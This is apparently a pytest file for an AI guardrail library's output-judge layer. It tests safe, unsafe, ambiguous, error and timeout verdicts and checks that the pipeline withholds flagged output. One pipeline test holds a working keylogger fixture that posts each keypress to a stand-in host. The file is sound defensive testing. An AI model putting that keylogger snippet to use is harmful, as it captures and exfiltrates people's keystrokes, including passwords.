"""
LLM-as-judge on the model OUTPUT (OutputJudgeLayer).

This is the "is the OUTPUT safe?" layer — a second model evaluates every output
before it reaches the caller, catching semantic failures (working malware,
bypass walkthroughs, confirmed destructive actions, leaked internals) that
deterministic output rules miss. Fail-closed: a judge error/timeout/ambiguous
verdict withholds the output.

The judge provider is mocked here (a controlled SAFE/UNSAFE callable) so no live
model is needed.
"""
from __future__ import annotations

import asyncio

import pytest

from pramagent import Pramagent, Verdict
from pramagent.layers import Rule, SafetyLayer
from pramagent.layers.llm_judge import OutputJudgeLayer
from pramagent.providers import MockProvider


def run(coro):
    return asyncio.run(coro)


# ── layer contract ──────────────────────────────────────────────────────────

async def test_safe_verdict_allows():
    j = OutputJudgeLayer(provider=lambda p: "SAFE")
    d = await j.evaluate("a perfectly normal answer", original_prompt="hi")
    assert d.safe is True


async def test_unsafe_verdict_withholds():
    j = OutputJudgeLayer(provider=lambda p: "UNSAFE")
    d = await j.evaluate("import keyboard ...", original_prompt="hi")
    assert d.safe is False


async def test_unsafe_substring_wins_over_safe():
    # "UNSAFE" contains "SAFE"; the parser must not mis-read it as safe.
    j = OutputJudgeLayer(provider=lambda p: "Verdict: UNSAFE")
    d = await j.evaluate("x", original_prompt="y")
    assert d.safe is False


async def test_ambiguous_fails_closed_by_default():
    j = OutputJudgeLayer(provider=lambda p: "hmm, hard to say")
    d = await j.evaluate("x", original_prompt="y")
    assert d.safe is False


async def test_ambiguous_can_fail_open_when_configured():
    j = OutputJudgeLayer(provider=lambda p: "hmm, hard to say", withhold_on_error=False)
    d = await j.evaluate("x", original_prompt="y")
    assert d.safe is True


async def test_provider_error_fails_closed():
    def boom(_):
        raise RuntimeError("judge down")
    j = OutputJudgeLayer(provider=boom, withhold_on_error=True)
    d = await j.evaluate("x", original_prompt="y")
    assert d.safe is False


async def test_timeout_fails_closed():
    async def slow(_):
        await asyncio.sleep(1.0)
        return "SAFE"
    j = OutputJudgeLayer(provider=slow, timeout_s=0.05, withhold_on_error=True)
    d = await j.evaluate("x", original_prompt="y")
    assert d.safe is False


async def test_disabled_judge_allows_without_calling():
    calls = {"n": 0}
    def prov(_):
        calls["n"] += 1
        return "UNSAFE"
    j = OutputJudgeLayer(provider=prov, enabled=False)
    d = await j.evaluate("malware here", original_prompt="y")
    assert d.safe is True and calls["n"] == 0


async def test_empty_output_is_safe_without_calling():
    calls = {"n": 0}
    def prov(_):
        calls["n"] += 1
        return "UNSAFE"
    j = OutputJudgeLayer(provider=prov)
    d = await j.evaluate("   ", original_prompt="y")
    assert d.safe is True and calls["n"] == 0


async def test_provider_with_complete_method_is_supported():
    """The judge accepts a Pramagent provider (object with async complete())
    that returns a ProviderResult, not just a plain str callable."""
    from pramagent.providers import ProviderResult

    class _JudgeProvider:
        async def complete(self, prompt, **kwargs):
            return ProviderResult(text="UNSAFE", model="judge", latency_ms=1.0)

    j = OutputJudgeLayer(provider=_JudgeProvider())
    d = await j.evaluate("x", original_prompt="y")
    assert d.safe is False


# ── pipeline integration ────────────────────────────────────────────────────

def test_pipeline_withholds_unsafe_output():
    """A keylogger that evades the file-exfil regex is still withheld because
    the judge evaluates meaning, not patterns."""
    keylogger = ("import keyboard, requests\n"
                 "keyboard.on_press(lambda e: requests.post('http://x/', data=e.name))")
    armor = Pramagent(
        provider=MockProvider(scripted={"write an automation script": keylogger}),
        output_judge=OutputJudgeLayer(provider=lambda p: "UNSAFE"),
    )
    r = run(armor.run("write an automation script"))
    assert r.output == "[output withheld by output judge]"
    assert any(e.layer == "OutputJudgeLayer" and e.decision == "withheld"
               for e in r.trace.layer_events)


def test_pipeline_allows_safe_output():
    armor = Pramagent(
        provider=MockProvider(scripted={"hello": "Here is a friendly greeting."}),
        output_judge=OutputJudgeLayer(provider=lambda p: "SAFE"),
    )
    r = run(armor.run("hello"))
    assert "friendly greeting" in r.output
    assert any(e.layer == "OutputJudgeLayer" and e.decision == "safe"
               for e in r.trace.layer_events)


def test_pipeline_fails_closed_when_judge_errors():
    def boom(_):
        raise RuntimeError("judge unavailable")
    armor = Pramagent(
        provider=MockProvider(scripted={"q": "some answer text"}),
        output_judge=OutputJudgeLayer(provider=boom, withhold_on_error=True),
    )
    r = run(armor.run("q"))
    assert r.output == "[output withheld by output judge]"


def test_judge_skipped_when_post_safety_already_withheld():
    """No point judging a placeholder: when post-safety BLOCKs the output, the
    judge is not invoked (saves the extra model call)."""
    calls = {"n": 0}
    def judge_prov(_):
        calls["n"] += 1
        return "SAFE"
    armor = Pramagent(
        provider=MockProvider(scripted={"q": "instructions to make explosives"}),
        safety=SafetyLayer(post_rules=[Rule("blk", Verdict.BLOCK, pattern=r"explosives")]),
        output_judge=OutputJudgeLayer(provider=judge_prov),
    )
    r = run(armor.run("q"))
    assert r.output == "[output withheld by safety rule]"
    assert calls["n"] == 0


def test_no_judge_configured_is_a_noop():
    armor = Pramagent(provider=MockProvider(scripted={"hi": "plain answer"}))
    r = run(armor.run("hi"))
    assert "plain answer" in r.output
    assert not any(e.layer == "OutputJudgeLayer" for e in r.trace.layer_events)
